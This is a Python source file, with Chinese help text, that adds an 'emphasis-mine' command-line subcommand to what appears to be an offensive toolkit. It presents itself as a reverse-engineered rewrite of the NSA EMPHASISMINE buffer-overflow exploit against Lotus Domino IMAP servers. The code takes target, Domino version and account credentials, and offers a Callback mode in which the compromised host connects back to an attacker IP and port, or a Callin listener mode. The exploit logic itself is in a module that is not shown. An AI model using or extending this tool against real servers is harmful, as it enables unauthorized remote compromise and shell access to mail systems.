"""emphasis-mine — EMPHASISMINE Lotus Domino IMAP 远程利用。

Python 重写的 NSA Emphasismine 工具 `Emphasismine-3.4.0.exe`
(C++ / DAVE framework)，通过 IDA Pro / x32dbg 逆向恢复。
实现了该工具的 key=value 参数接口及其 Lotus Domino IMAP 利用流程。
"""

from . import emphasis_mine


# ---------------------------------------------------------------------------
# Subcommand entrypoint.
# ---------------------------------------------------------------------------
def emphasis_mine_handle(args):
    """Run the EMPHASISMINE exploitation sequence against the supplied host."""
    return emphasis_mine.run_function(
        target=args.target,
        port=args.port,
        timeout=args.timeout,
        domino_version=args.domino_version,
        target_acct_usr=args.target_acct_usr,
        target_acct_pwd=args.target_acct_pwd,
        direction=args.direction,
        callback_ip=args.callback_ip,
        callback_port=args.callback_port,
        callback_local_port=args.callback_local_port,
        listen_port=args.listen_port,
        listen_local_port=args.listen_local_port,
        listen_wait=args.listen_wait,
        verbose=args.verbose,
    )


def reg_subparser(subparsers):
    """Register the `emphasis-mine` subcommand on an argparse
    subparsers group."""
    p = subparsers.add_parser(
        "emphasis-mine",
        help="EMPHASISMINE Lotus Domino IMAP 远程利用",
        description="Python 重写的 NSA Emphasismine (EMPHASISMINE) Lotus "
                    "Domino IMAP 远程利用工具 Emphasismine-3.4.0。针对 Lotus "
                    "Domino IMAP 服务器，执行缓冲区溢出利用。",
    )
    p.add_argument(
        "target", metavar="TARGET",
        help="目标主机名或 IP",
    )
    p.add_argument(
        "-p", "--port", type=int, default=143,
        help="目标 IMAP 端口（默认 143）",
    )
    p.add_argument(
        "--timeout", type=int, default=60,
        help="阻塞网络调用超时秒（-1 表示无超时，默认 60）",
    )
    p.add_argument(
        "--domino-version",
        choices=["6.5.4", "6.5.5", "6.5.5FP1", "7.0", "7.0.1", "7.0.2",
                 "7.0.3", "7.0.3FP1", "7.0.4", "8.0", "8.0.1", "8.0.2",
                 "8.5", "8.5.1", "8.5.1FP1", "8.5.1FP2", "8.5.1FP3",
                 "8.5.1FP4", "8.5.1FP5", "8.5.2"],
        default="8.5.2",
        help="目标 Lotus Domino 版本（默认 8.5.2）",
    )
    p.add_argument(
        "--target-acct-usr", metavar="USER",
        help="目标账户用户名",
    )
    p.add_argument(
        "--target-acct-pwd", metavar="PASS",
        help="目标账户密码",
    )
    p.add_argument(
        "--direction",
        choices=["Callback", "Callin"],
        default="Callback",
        help="载荷方向：Callback 目标连回，Callin 目标监听等待连入",
    )
    p.add_argument(
        "--callback-ip", metavar="IP",
        help="Callback 模式：目标连回的 IP 地址",
    )
    p.add_argument(
        "--callback-port", type=int, metavar="PORT",
        help="Callback 模式：目标连回的端口",
    )
    p.add_argument(
        "--callback-local-port", type=int, metavar="PORT",
        help="Callback 模式：本地监听端口",
    )
    p.add_argument(
        "--listen-port", type=int, metavar="PORT",
        help="Callin 模式：目标监听端口",
    )
    p.add_argument(
        "--listen-local-port", type=int, metavar="PORT",
        help="Callin 模式：本地监听端口",
    )
    p.add_argument(
        "--listen-wait", type=int, default=10,
        help="Callin 模式：连入前等待秒数（默认 10）",
    )
    p.add_argument(
        "-v", "--verbose", action="store_true",
        help="输出参数与调试信息",
    )
    p.set_defaults(func=emphasis_mine_handle)
